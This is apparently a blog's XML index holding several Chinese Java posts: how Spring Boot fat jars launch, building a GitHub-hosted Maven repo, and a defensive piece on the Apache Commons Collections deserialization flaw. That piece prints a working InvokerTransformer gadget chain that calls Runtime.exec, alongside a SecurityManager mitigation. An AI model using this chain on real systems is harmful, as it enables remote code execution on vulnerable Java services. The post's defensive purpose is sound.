plugin是把下面这个script打包到fat jar的最前面部分。 https://github.com/spring-projects/spring-boot/blob/1ca9cdabf71f3f972a9c1fdbfe9a9f5fda561287/spring-boot-tools/spring-boot-loader-tools/src/main/resources/org/springframework/boot/loader/tools/launch.script 这个launch.script 支持很多变量设置。还可以自动识别是处于auto还是service不同mode中。 所谓的auto mode就是指直接运行jar/war： 1./demo.jar 而service mode则是由操作系统在启动service的情况： 1service demo start/stop/restart/status 所以fat jar可以直接在普通的命令行里执行，./xxx.jar 或者link到/etc/init.d/下，变为一个service。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring boot应用启动原理分析]]></title>
    <url>%2Fspring-boot-application-start-analysis%2F</url>
    <content type="text"><![CDATA[前言本文分析的是spring boot 1.3. 的工作原理。spring boot 1.4. 之后打包结构发现了变化，增加了BOOT-INF目录，但是基本原理还是不变的。 关于spring boot 1.4.* 里ClassLoader的变化，可以参考：http://hengyunabc.github.io/spring-boot-classloader/ spring boot quick start在spring boot里，很吸引人的一个特性是可以直接把应用打包成为一个jar/war，然后这个jar/war是可以直接启动的，不需要另外配置一个Web Server。 如果之前没有使用过spring boot可以通过下面的demo来感受下。下面以这个工程为例，演示如何启动Spring boot项目： 123git clone git@github.com:hengyunabc/spring-boot-demo.gitmvn spring-boot-demojava -jar target/demo-0.0.1-SNAPSHOT.jar 如果使用的IDE是spring sts或者idea，可以通过向导来创建spring boot项目。 也可以参考官方教程：http://docs.spring.io/spring-boot/docs/current-SNAPSHOT/reference/htmlsingle/#getting-started-first-application 对spring boot的两个疑问刚开始接触spring boot时，通常会有这些疑问 spring boot如何启动的？ spring boot embed tomcat是如何工作的？ 静态文件，jsp，网页模板这些是如何加载到的？ 下面来分析spring boot是如何做到的。 打包为单个jar时，spring boot的启动方式maven打包之后，会生成两个jar文件： 12demo-0.0.1-SNAPSHOT.jardemo-0.0.1-SNAPSHOT.jar.original 其中demo-0.0.1-SNAPSHOT.jar.original是默认的maven-jar-plugin生成的包。 demo-0.0.1-SNAPSHOT.jar是spring boot maven插件生成的jar包，里面包含了应用的依赖，以及spring boot相关的类。下面称之为fat jar。 先来查看spring boot打好的包的目录结构（不重要的省略掉）： 123456789101112131415161718192021├── META-INF│ ├── MANIFEST.MF├── application.properties├── com│ └── example│ └── SpringBootDemoApplication.class├── lib│ ├── aopalliance-1.0.jar│ ├── spring-beans-4.2.3.RELEASE.jar│ ├── ...└── org └── springframework └── boot └── loader ├── ExecutableArchiveLauncher.class ├── JarLauncher.class ├── JavaAgentDetector.class ├── LaunchedURLClassLoader.class ├── Launcher.class ├── MainMethodRunner.class ├── ... 依次来看下这些内容。 MANIFEST.MF12345678Manifest-Version: 1.0Start-Class: com.example.SpringBootDemoApplicationImplementation-Vendor-Id: com.exampleSpring-Boot-Version: 1.3.0.RELEASECreated-By: Apache Maven 3.3.3Build-Jdk: 1.8.0_60Implementation-Vendor: Pivotal Software, Inc.Main-Class: org.springframework.boot.loader.JarLauncher 可以看到有Main-Class是org.springframework.boot.loader.JarLauncher ，这个是jar启动的Main函数。 还有一个Start-Class是com.example.SpringBootDemoApplication，这个是我们应用自己的Main函数。 1234567@SpringBootApplicationpublic class SpringBootDemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(SpringBootDemoApplication.class, args); &#125;&#125; com/example 目录这下面放的是应用的.class文件。 lib目录这里存放的是应用的Maven依赖的jar包文件。比如spring-beans，spring-mvc等jar。 org/springframework/boot/loader 目录这下面存放的是Spring boot loader的.class文件。 Archive的概念 archive即归档文件，这个概念在linux下比较常见 通常就是一个tar/zip格式的压缩包 jar是zip格式 在spring boot里，抽象出了Archive的概念。 一个archive可以是一个jar（JarFileArchive），也可以是一个文件目录（ExplodedArchive）。可以理解为Spring boot抽象出来的统一访问资源的层。 上面的demo-0.0.1-SNAPSHOT.jar 是一个Archive，然后demo-0.0.1-SNAPSHOT.jar里的/lib目录下面的每一个Jar包，也是一个Archive。 12345public abstract class Archive &#123; public abstract URL getUrl(); public String getMainClass(); public abstract Collection&lt;Entry&gt; getEntries(); public abstract List&lt;Archive&gt; getNestedArchives(EntryFilter filter); 可以看到Archive有一个自己的URL，比如： 1jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/ 还有一个getNestedArchives函数，这个实际返回的是demo-0.0.1-SNAPSHOT.jar/lib下面的jar的Archive列表。它们的URL是： 12jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/lib/aopalliance-1.0.jarjar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/lib/spring-beans-4.2.3.RELEASE.jar JarLauncher从MANIFEST.MF可以看到Main函数是JarLauncher，下面来分析它的工作流程。 JarLauncher类的继承结构是： 12class JarLauncher extends ExecutableArchiveLauncherclass ExecutableArchiveLauncher extends Launcher 以demo-0.0.1-SNAPSHOT.jar创建一个Archive：JarLauncher先找到自己所在的jar，即demo-0.0.1-SNAPSHOT.jar的路径，然后创建了一个Archive。 下面的代码展示了如何从一个类找到它的加载的位置的技巧： 12345678910111213141516protected final Archive createArchive() throws Exception &#123; ProtectionDomain protectionDomain = getClass().getProtectionDomain(); CodeSource codeSource = protectionDomain.getCodeSource(); URI location = (codeSource == null ? null : codeSource.getLocation().toURI()); String path = (location == null ? null : location.getSchemeSpecificPart()); if (path == null) &#123; throw new IllegalStateException("Unable to determine code source archive"); &#125; File root = new File(path); if (!root.exists()) &#123; throw new IllegalStateException( "Unable to determine code source archive from " + root); &#125; return (root.isDirectory() ? new ExplodedArchive(root) : new JarFileArchive(root));&#125; 获取lib/下面的jar，并创建一个LaunchedURLClassLoaderJarLauncher创建好Archive之后，通过getNestedArchives函数来获取到demo-0.0.1-SNAPSHOT.jar/lib下面的所有jar文件，并创建为List。 注意上面提到，Archive都是有自己的URL的。 获取到这些Archive的URL之后，也就获得了一个URL[]数组，用这个来构造一个自定义的ClassLoader：LaunchedURLClassLoader。 创建好ClassLoader之后，再从MANIFEST.MF里读取到Start-Class，即com.example.SpringBootDemoApplication，然后创建一个新的线程来启动应用的Main函数。 12345678910111213141516171819202122/** * Launch the application given the archive file and a fully configured classloader. */protected void launch(String[] args, String mainClass, ClassLoader classLoader) throws Exception &#123; Runnable runner = createMainMethodRunner(mainClass, args, classLoader); Thread runnerThread = new Thread(runner); runnerThread.setContextClassLoader(classLoader); runnerThread.setName(Thread.currentThread().getName()); runnerThread.start();&#125;/** * Create the &#123;@code MainMethodRunner&#125; used to launch the application. */protected Runnable createMainMethodRunner(String mainClass, String[] args, ClassLoader classLoader) throws Exception &#123; Class&lt;?&gt; runnerClass = classLoader.loadClass(RUNNER_CLASS); Constructor&lt;?&gt; constructor = runnerClass.getConstructor(String.class, String[].class); return (Runnable) constructor.newInstance(mainClass, args);&#125; LaunchedURLClassLoaderLaunchedURLClassLoader和普通的URLClassLoader的不同之处是，它提供了从Archive里加载.class的能力。 结合Archive提供的getEntries函数，就可以获取到Archive里的Resource。当然里面的细节还是很多的，下面再描述。 spring boot应用启动流程总结看到这里，可以总结下Spring Boot应用的启动流程： spring boot应用打包之后，生成一个fat jar，里面包含了应用依赖的jar包，还有Spring boot loader相关的类 Fat jar的启动Main函数是JarLauncher，它负责创建一个LaunchedURLClassLoader来加载/lib下面的jar，并以一个新线程启动应用的Main函数。 spring boot loader里的细节代码地址：https://github.com/spring-projects/spring-boot/tree/master/spring-boot-tools/spring-boot-loader JarFile URL的扩展Spring boot能做到以一个fat jar来启动，最重要的一点是它实现了jar in jar的加载方式。 JDK原始的JarFile URL的定义可以参考这里： http://docs.oracle.com/javase/7/docs/api/java/net/JarURLConnection.html 原始的JarFile URL是这样子的： 1jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/ jar包里的资源的URL：1jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/com/example/SpringBootDemoApplication.class 可以看到对于Jar里的资源，定义以’!/‘来分隔。原始的JarFile URL只支持一个’!/‘。 Spring boot扩展了这个协议，让它支持多个’!/‘，就可以表示jar in jar，jar in directory的资源了。 比如下面的URL表示demo-0.0.1-SNAPSHOT.jar这个jar里lib目录下面的spring-beans-4.2.3.RELEASE.jar里面的MANIFEST.MF： 1jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/lib/spring-beans-4.2.3.RELEASE.jar!/META-INF/MANIFEST.MF 自定义URLStreamHandler，扩展JarFile和JarURLConnection在构造一个URL时，可以传递一个Handler，而JDK自带有默认的Handler类，应用可以自己注册Handler来处理自定义的URL。 123456public URL(String protocol, String host, int port, String file, URLStreamHandler handler) throws MalformedURLException 参考：https://docs.oracle.com/javase/8/docs/api/java/net/URL.html#URL-java.lang.String-java.lang.String-int-java.lang.String- Spring boot通过注册了一个自定义的Handler类来处理多重jar in jar的逻辑。 这个Handler内部会用SoftReference来缓存所有打开过的JarFile。 在处理像下面这样的URL时，会循环处理’!/‘分隔符，从最上层出发，先构造出demo-0.0.1-SNAPSHOT.jar这个JarFile，再构造出spring-beans-4.2.3.RELEASE.jar这个JarFile，然后再构造出指向MANIFEST.MF的JarURLConnection。 1jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/lib/spring-beans-4.2.3.RELEASE.jar!/META-INF/MANIFEST.MF 12345678910111213141516171819202122232425//org.springframework.boot.loader.jar.Handlerpublic class Handler extends URLStreamHandler &#123; private static final String SEPARATOR = "!/"; private static SoftReference&lt;Map&lt;File, JarFile&gt;&gt; rootFileCache; @Override protected URLConnection openConnection(URL url) throws IOException &#123; if (this.jarFile != null) &#123; return new JarURLConnection(url, this.jarFile); &#125; try &#123; return new JarURLConnection(url, getRootJarFileFromUrl(url)); &#125; catch (Exception ex) &#123; return openFallbackConnection(url, ex); &#125; &#125; public JarFile getRootJarFileFromUrl(URL url) throws IOException &#123; String spec = url.getFile(); int separatorIndex = spec.indexOf(SEPARATOR); if (separatorIndex == -1) &#123; throw new MalformedURLException("Jar URL does not contain !/ separator"); &#125; String name = spec.substring(0, separatorIndex); return getRootJarFile(name); &#125; ClassLoader如何读取到Resource对于一个ClassLoader，它需要哪些能力？ 查找资源 读取资源 对应的API是： 12public URL findResource(String name)public InputStream getResourceAsStream(String name) 上面提到，Spring boot构造LaunchedURLClassLoader时，传递了一个URL[]数组。数组里是lib目录下面的jar的URL。 对于一个URL，JDK或者ClassLoader如何知道怎么读取到里面的内容的？ 实际上流程是这样子的： LaunchedURLClassLoader.loadClass URL.getContent() URL.openConnection() Handler.openConnection(URL) 最终调用的是JarURLConnection的getInputStream()函数。 123456789//org.springframework.boot.loader.jar.JarURLConnection @Override public InputStream getInputStream() throws IOException &#123; connect(); if (this.jarEntryName.isEmpty()) &#123; throw new IOException("no entry name specified"); &#125; return this.jarEntryData.getInputStream(); &#125; 从一个URL，到最终读取到URL里的内容，整个过程是比较复杂的，总结下： spring boot注册了一个Handler来处理”jar:”这种协议的URL spring boot扩展了JarFile和JarURLConnection，内部处理jar in jar的情况 在处理多重jar in jar的URL时，spring boot会循环处理，并缓存已经加载到的JarFile 对于多重jar in jar，实际上是解压到了临时目录来处理，可以参考JarFileArchive里的代码 在获取URL的InputStream时，最终获取到的是JarFile里的JarEntryData 这里面的细节很多，只列出比较重要的一些点。 然后，URLClassLoader是如何getResource的呢？ URLClassLoader在构造时，有URL[]数组参数，它内部会用这个数组来构造一个URLClassPath: 1URLClassPath ucp = new URLClassPath(urls); 在 URLClassPath 内部会为这些URLS 都构造一个Loader，然后在getResource时，会从这些Loader里一个个去尝试获取。如果获取成功的话，就像下面那样包装为一个Resource。 123456789101112131415161718192021222324252627282930313233343536Resource getResource(final String name, boolean check) &#123; final URL url; try &#123; url = new URL(base, ParseUtil.encodePath(name, false)); &#125; catch (MalformedURLException e) &#123; throw new IllegalArgumentException("name"); &#125; final URLConnection uc; try &#123; if (check) &#123; URLClassPath.check(url); &#125; uc = url.openConnection(); InputStream in = uc.getInputStream(); if (uc instanceof JarURLConnection) &#123; /* Need to remember the jar file so it can be closed * in a hurry. */ JarURLConnection juc = (JarURLConnection)uc; jarfile = JarLoader.checkJar(juc.getJarFile()); &#125; &#125; catch (Exception e) &#123; return null; &#125; return new Resource() &#123; public String getName() &#123; return name; &#125; public URL getURL() &#123; return url; &#125; public URL getCodeSourceURL() &#123; return base; &#125; public InputStream getInputStream() throws IOException &#123; return uc.getInputStream(); &#125; public int getContentLength() throws IOException &#123; return uc.getContentLength(); &#125; &#125;;&#125; 从代码里可以看到，实际上是调用了url.openConnection()。这样完整的链条就可以连接起来了。 注意，URLClassPath这个类的代码在JDK里没有自带，在这里看到 http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7u40-b43/sun/misc/URLClassPath.java#506 在IDE/开放目录启动Spring boot应用在上面只提到在一个fat jar里启动Spring boot应用的过程，下面分析IDE里Spring boot是如何启动的。 在IDE里，直接运行的Main函数是应用自己的Main函数： 1234567@SpringBootApplicationpublic class SpringBootDemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(SpringBootDemoApplication.class, args); &#125;&#125; 其实在IDE里启动Spring boot应用是最简单的一种情况，因为依赖的Jar都让IDE放到classpath里了，所以Spring boot直接启动就完事了。 还有一种情况是在一个开放目录下启动Spring boot启动。所谓的开放目录就是把fat jar解压，然后直接启动应用。 1java org.springframework.boot.loader.JarLauncher 这时，Spring boot会判断当前是否在一个目录里，如果是的，则构造一个ExplodedArchive（前面在jar里时是JarFileArchive），后面的启动流程类似fat jar的。 Embead Tomcat的启动流程判断是否在web环境spring boot在启动时，先通过一个简单的查找Servlet类的方式来判断是不是在web环境： 1234567891011private static final String[] WEB_ENVIRONMENT_CLASSES = &#123; "javax.servlet.Servlet", "org.springframework.web.context.ConfigurableWebApplicationContext" &#125;;private boolean deduceWebEnvironment() &#123; for (String className : WEB_ENVIRONMENT_CLASSES) &#123; if (!ClassUtils.isPresent(className, null)) &#123; return false; &#125; &#125; return true;&#125; 如果是的话，则会创建AnnotationConfigEmbeddedWebApplicationContext，否则Spring context就是AnnotationConfigApplicationContext： 1234567891011121314151617//org.springframework.boot.SpringApplication protected ConfigurableApplicationContext createApplicationContext() &#123; Class&lt;?&gt; contextClass = this.applicationContextClass; if (contextClass == null) &#123; try &#123; contextClass = Class.forName(this.webEnvironment ? DEFAULT_WEB_CONTEXT_CLASS : DEFAULT_CONTEXT_CLASS); &#125; catch (ClassNotFoundException ex) &#123; throw new IllegalStateException( "Unable create a default ApplicationContext, " + "please specify an ApplicationContextClass", ex); &#125; &#125; return (ConfigurableApplicationContext) BeanUtils.instantiate(contextClass); &#125; 获取EmbeddedServletContainerFactory的实现类spring boot通过获取EmbeddedServletContainerFactory来启动对应的web服务器。 常用的两个实现类是TomcatEmbeddedServletContainerFactory和JettyEmbeddedServletContainerFactory。 启动Tomcat的代码： 1234567891011121314151617181920//TomcatEmbeddedServletContainerFactory@Overridepublic EmbeddedServletContainer getEmbeddedServletContainer( ServletContextInitializer... initializers) &#123; Tomcat tomcat = new Tomcat(); File baseDir = (this.baseDirectory != null ? this.baseDirectory : createTempDir("tomcat")); tomcat.setBaseDir(baseDir.getAbsolutePath()); Connector connector = new Connector(this.protocol); tomcat.getService().addConnector(connector); customizeConnector(connector); tomcat.setConnector(connector); tomcat.getHost().setAutoDeploy(false); tomcat.getEngine().setBackgroundProcessorDelay(-1); for (Connector additionalConnector : this.additionalTomcatConnectors) &#123; tomcat.getService().addConnector(additionalConnector); &#125; prepareContext(tomcat.getHost(), initializers); return getTomcatEmbeddedServletContainer(tomcat);&#125; 会为tomcat创建一个临时文件目录，如：/tmp/tomcat.2233614112516545210.8080，做为tomcat的basedir。里面会放tomcat的临时文件，比如work目录。 还会初始化Tomcat的一些Servlet，比如比较重要的default/jsp servlet： 1234567891011121314151617181920212223private void addDefaultServlet(Context context) &#123; Wrapper defaultServlet = context.createWrapper(); defaultServlet.setName("default"); defaultServlet.setServletClass("org.apache.catalina.servlets.DefaultServlet"); defaultServlet.addInitParameter("debug", "0"); defaultServlet.addInitParameter("listings", "false"); defaultServlet.setLoadOnStartup(1); // Otherwise the default location of a Spring DispatcherServlet cannot be set defaultServlet.setOverridable(true); context.addChild(defaultServlet); context.addServletMapping("/", "default");&#125;private void addJspServlet(Context context) &#123; Wrapper jspServlet = context.createWrapper(); jspServlet.setName("jsp"); jspServlet.setServletClass(getJspServletClassName()); jspServlet.addInitParameter("fork", "false"); jspServlet.setLoadOnStartup(3); context.addChild(jspServlet); context.addServletMapping("*.jsp", "jsp"); context.addServletMapping("*.jspx", "jsp");&#125; spring boot的web应用如何访问Resource当spring boot应用被打包为一个fat jar时，是如何访问到web resource的？ 实际上是通过Archive提供的URL，然后通过Classloader提供的访问classpath resource的能力来实现的。 index.html比如需要配置一个index.html，这个可以直接放在代码里的src/main/resources/static目录下。 对于index.html欢迎页，spring boot在初始化时，就会创建一个ViewController来处理： 12345678//ResourcePropertiespublic class ResourceProperties implements ResourceLoaderAware &#123; private static final String[] SERVLET_RESOURCE_LOCATIONS = &#123; "/" &#125;; private static final String[] CLASSPATH_RESOURCE_LOCATIONS = &#123; "classpath:/META-INF/resources/", "classpath:/resources/", "classpath:/static/", "classpath:/public/" &#125;; 123456789//WebMvcAutoConfigurationAdapter @Override public void addViewControllers(ViewControllerRegistry registry) &#123; Resource page = this.resourceProperties.getWelcomePage(); if (page != null) &#123; logger.info("Adding welcome page: " + page); registry.addViewController("/").setViewName("forward:index.html"); &#125; &#125; template像页面模板文件可以放在src/main/resources/template目录下。但这个实际上是模板的实现类自己处理的。比如ThymeleafProperties类里的： 1public static final String DEFAULT_PREFIX = "classpath:/templates/"; jspjsp页面和template类似。实际上是通过spring mvc内置的JstlView来处理的。 可以通过配置spring.view.prefix来设定jsp页面的目录： 1spring.view.prefix: /WEB-INF/jsp/ spring boot里统一的错误页面的处理对于错误页面，Spring boot也是通过创建一个BasicErrorController来统一处理的。 123@Controller@RequestMapping("$&#123;server.error.path:$&#123;error.path:/error&#125;&#125;")public class BasicErrorController extends AbstractErrorController 对应的View是一个简单的HTML提醒： 1234567891011121314151617@Configuration@ConditionalOnProperty(prefix = "server.error.whitelabel", name = "enabled", matchIfMissing = true)@Conditional(ErrorTemplateMissingCondition.class)protected static class WhitelabelErrorViewConfiguration &#123; private final SpelView defaultErrorView = new SpelView( "&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;" + "&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;" + "&lt;div id='created'&gt;$&#123;timestamp&#125;&lt;/div&gt;" + "&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;" + "&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;"); @Bean(name = "error") @ConditionalOnMissingBean(name = "error") public View defaultErrorView() &#123; return this.defaultErrorView; &#125; spring boot的这个做法很好，避免了传统的web应用来出错时，默认抛出异常，容易泄密。 spring boot应用的maven打包过程先通过maven-shade-plugin生成一个包含依赖的jar，再通过spring-boot-maven-plugin插件把spring boot loader相关的类，还有MANIFEST.MF打包到jar里。 spring boot里有颜色日志的实现当在shell里启动spring boot应用时，会发现它的logger输出是有颜色的，这个特性很有意思。 可以通过这个设置来关闭： 1spring.output.ansi.enabled=false 原理是通过AnsiOutputApplicationListener ，这个来获取这个配置，然后设置logback在输出时，加了一个 ColorConverter，通过org.springframework.boot.ansi.AnsiOutput ，对一些字段进行了渲染。 一些代码小技巧实现ClassLoader时，支持JDK7并行加载可以参考LaunchedURLClassLoader里的LockProvider 123456789101112131415161718192021222324252627282930313233public class LaunchedURLClassLoader extends URLClassLoader &#123; private static LockProvider LOCK_PROVIDER = setupLockProvider(); private static LockProvider setupLockProvider() &#123; try &#123; ClassLoader.registerAsParallelCapable(); return new Java7LockProvider(); &#125; catch (NoSuchMethodError ex) &#123; return new LockProvider(); &#125; &#125; @Override protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (LaunchedURLClassLoader.LOCK_PROVIDER.getLock(this, name)) &#123; Class&lt;?&gt; loadedClass = findLoadedClass(name); if (loadedClass == null) &#123; Handler.setUseFastConnectionExceptions(true); try &#123; loadedClass = doLoadClass(name); &#125; finally &#123; Handler.setUseFastConnectionExceptions(false); &#125; &#125; if (resolve) &#123; resolveClass(loadedClass); &#125; return loadedClass; &#125; &#125; 检测jar包是否通过agent加载的InputArgumentsJavaAgentDetector，原理是检测jar的URL是否有”-javaagent:”的前缀。 1private static final String JAVA_AGENT_PREFIX = "-javaagent:"; 获取进程的PIDApplicationPid，可以获取PID。 123456789private String getPid() &#123; try &#123; String jvmName = ManagementFactory.getRuntimeMXBean().getName(); return jvmName.split("@")[0]; &#125; catch (Throwable ex) &#123; return null; &#125;&#125; 包装Logger类spring boot里自己包装了一套logger，支持java, log4j, log4j2, logback，以后有需要自己包装logger时，可以参考这个。 在org.springframework.boot.logging包下面。 获取原始启动的main函数通过堆栈里获取的方式，判断main函数，找到原始启动的main函数。 1234567891011121314private Class&lt;?&gt; deduceMainApplicationClass() &#123; try &#123; StackTraceElement[] stackTrace = new RuntimeException().getStackTrace(); for (StackTraceElement stackTraceElement : stackTrace) &#123; if ("main".equals(stackTraceElement.getMethodName())) &#123; return Class.forName(stackTraceElement.getClassName()); &#125; &#125; &#125; catch (ClassNotFoundException ex) &#123; // Swallow and continue &#125; return null;&#125; spirng boot的一些缺点：当spring boot应用以一个fat jar方式运行时，会遇到一些问题。以下是个人看法： 日志不知道放哪，默认是输出到stdout的 数据目录不知道放哪, jenkinns的做法是放到 ${user.home}/.jenkins 下面 相对目录API不能使用，servletContext.getRealPath(“/“) 返回的是NULL spring boot应用喜欢把配置都写到代码里，有时会带来混乱。一些简单可以用xml来表达的配置可能会变得难读，而且凌乱。 总结spring boot通过扩展了jar协议，抽象出Archive概念，和配套的JarFile，JarUrlConnection，LaunchedURLClassLoader，从而实现了上层应用无感知的all in one的开发体验。尽管Executable war并不是spring提出的概念，但spring boot让它发扬光大。 spring boot是一个惊人的项目，可以说是spring的第二春，spring-cloud-config, spring-session, metrics, remote shell等都是深爱开发者喜爱的项目、特性。几乎可以肯定设计者是有丰富的一线开发经验，深知开发人员的痛点。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>spring</tag>
        <tag>ClassLoader</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[禁止JVM执行外部命令Runtime.exec -- 由Apache Commons Collections漏洞引发的思考]]></title>
    <url>%2Fjava-serialization-security%2F</url>
    <content type="text"><![CDATA[update: 2015-11-16 新版apache commons collections 3.2.2修复漏洞新版本的apache commons collections默认禁止了不安全的一些转换类。可以通过升级来修复漏洞。参考release说明：https://commons.apache.org/proper/commons-collections/release_3_2_2.html Dubbo rpc远程代码执行的例子update: 2015-11-13 重新思考了下这个漏洞，给出一个dubbo rpc远程代码执行的例子。 https://github.com/hengyunabc/dubbo-apache-commons-collections-bug 可以说很多公司开放的rpc，只要协议里支持java序列化方式，classpath里有apache commons collections的jar包，都存在被远程代码执行的风险。 至于能不能通过http接口再调用dubbo rpc远程代码，貌似不太可行。因为信息难以传递。 Apache Commons Collections远程代码执行漏洞最近出来一个比较严重的漏洞，在使用了Apache Commons Collections的Java应用，可以远程代码执行。包括最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用。 这个漏洞的严重的地方在于，即使你的代码里没有使用到Apache Commons Collections里的类，只要Java应用的Classpath里有Apache Commons Collections的jar包，都可以远程代码执行。 参考： https://github.com/frohoff/ysoserial http://blog.chaitin.com/2015-11-11_java_unserialize_rce/ 这个漏洞的演示很简单，只要在maven依赖里增加12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; 再执行下面的java代码：123456789101112131415Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; "getRuntime", new Class[0] &#125;), new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; "calc" &#125;) &#125;;Transformer transformedChain = new ChainedTransformer(transformers);Map innerMap = new HashMap();innerMap.put("value", "value");Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();onlyElement.setValue("foobar"); 这个漏洞的根本问题并不是Java序列化的问题，而是Apache Commons Collections允许链式的任意的类函数反射调用。攻击者通过允许Java序列化协议的端口，把攻击代码上传到服务器上，再由Apache Commons Collections里的TransformedMap来执行。 这里不对这个漏洞多做展开，可以看上面的参考文章。 如何简单的防止Java程序调用外部命令？从这个漏洞，引发了很久之前的一个念头：如何简单的防止Java程序调用外部命令？ java相对来说安全性问题比较少。出现的一些问题大部分是利用反射，最终用Runtime.exec(String cmd)函数来执行外部命令的。如果可以禁止JVM执行外部命令，未知漏洞的危害性会大大降低，可以大大提高JVM的安全性。 换而言之，就是如何禁止Java执行Runtime.exec(String cmd)之类的函数。 在Java里有一套Security Policy，但是实际上用的人比较少。因为配置起来太麻烦了。参考： http://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html http://docs.oracle.com/javase/8/docs/technotes/guides/security/permissions.html http://docs.gigaspaces.com/xap102sec/java-security-policy-file.html 详细的权限列表可以参考这个文档 从文档里可以知道，Java里并没有直接禁止Rumtine.exec 函数执行的权限。 禁止文件执行的权限在java.io.FilePermission里。如果想禁止所有外部文件执行，可以在下面的配置文件中把删除：1234```grant &#123; permission java.io.FilePermission &quot;&lt;&lt;ALL FILES&gt;&gt;&quot;, &quot;read, write, delete, execute&quot;;&#125;; 但是Java权限机制是白名单的，还有一大堆的权限要配置上去，非常复杂。从tomcat的配置就知道了。http://tomcat.apache.org/tomcat-7.0-doc/security-manager-howto.html所以Tomcat默认是没有启用Security Policy的，可以通过在命令加上-security参数来启用。1catalina.sh start -security 那么有没有简单的办法可以在代码里禁止Java执行外部命令？ 研究了下，通过扩展SecurityManager可以简单实现： 12345678910111213141516171819202122232425262728293031323334SecurityManager originalSecurityManager = System.getSecurityManager();if (originalSecurityManager == null) &#123; // 创建自己的SecurityManager SecurityManager sm = new SecurityManager() &#123; private void check(Permission perm) &#123; // 禁止exec if (perm instanceof java.io.FilePermission) &#123; String actions = perm.getActions(); if (actions != null &amp;&amp; actions.contains("execute")) &#123; throw new SecurityException("execute denied!"); &#125; &#125; // 禁止设置新的SecurityManager，保护自己 if (perm instanceof java.lang.RuntimePermission) &#123; String name = perm.getName(); if (name != null &amp;&amp; name.contains("setSecurityManager")) &#123; throw new SecurityException("System.setSecurityManager denied!"); &#125; &#125; &#125; @Override public void checkPermission(Permission perm) &#123; check(perm); &#125; @Override public void checkPermission(Permission perm, Object context) &#123; check(perm); &#125; &#125;; System.setSecurityManager(sm);&#125; 只要在Java代码里简单加上面那一段，就可以禁止执行外部程序了。 Java序列化的本身的蛋疼之处其实Java自身的序列化机制就比较蛋疼，可以参考Effective Java里的。http://allenlsy.com/NOTES-of-Effective-Java-10/ 并非禁止外部程序执行，Java程序就安全了要注意的是，如果可以任意执行Java代码，还可以做很多事情，比如写入ssh密钥，从而可以远程登陆，参考最近的Redis未授权访问漏洞：https://www.sebug.net/vuldb/ssvid-89715 总结禁止JVM执行外部命令，是一个简单有效的提高JVM安全性的办法。但是以前没有见到有相关的内容，有点奇怪。可以考虑在代码安全扫描时，加强对Runtime.exec相关代码的检测。有些开源库喜欢用Runtime.exec来执行命令获取网卡mac等操作，个人表示相当的蛋疼，不会使用这样子的代码。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>security</tag>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用github搭建个人maven仓库]]></title>
    <url>%2Fgithub-to-maven-repo%2F</url>
    <content type="text"><![CDATA[缘起之前看到有开源项目用了github来做maven仓库，寻思自己也做一个。研究了下，记录下。 简单来说，共有三步： deploy到本地目录 把本地目录提交到gtihub上 配置github地址为仓库地址 配置local file maven仓库deploy到本地maven可以通过http, ftp, ssh等deploy到远程服务器，也可以deploy到本地文件系统里。例如： 123456&lt;distributionManagement&gt; &lt;repository&gt; &lt;id&gt;hengyunabc-mvn-repo&lt;/id&gt; &lt;url&gt;file:/home/hengyunabc/code/maven-repo/repository/&lt;/url&gt; &lt;/repository&gt;&lt;/distributionManagement&gt; 通过命令行则是：1mvn deploy -DaltDeploymentRepository=hengyunabc-mvn-repo::default::file:/home/hengyunabc/code/maven-repo/repository/ 推荐使用命令行来deploy，避免在项目里显式配置。 https://maven.apache.org/plugins/maven-deploy-plugin/ https://maven.apache.org/plugins/maven-deploy-plugin/deploy-file-mojo.html 把本地仓库提交到github上上面把项目发布到本地目录home/hengyunabc/code/maven-repo/repository里，下面把这个目录提交到github上。 在Github上新建一个项目，然后把home/hengyunabc/code/maven-repo下的文件都提交到gtihub上。 123456cd /home/hengyunabc/code/maven-repo/git initgit add repository/*git commit -m 'deploy xxx'git remote add origin git@github.com:hengyunabc/maven-repo.gitgit push origin master 最终效果可以参考我的个人仓库： https://github.com/hengyunabc/maven-repo github 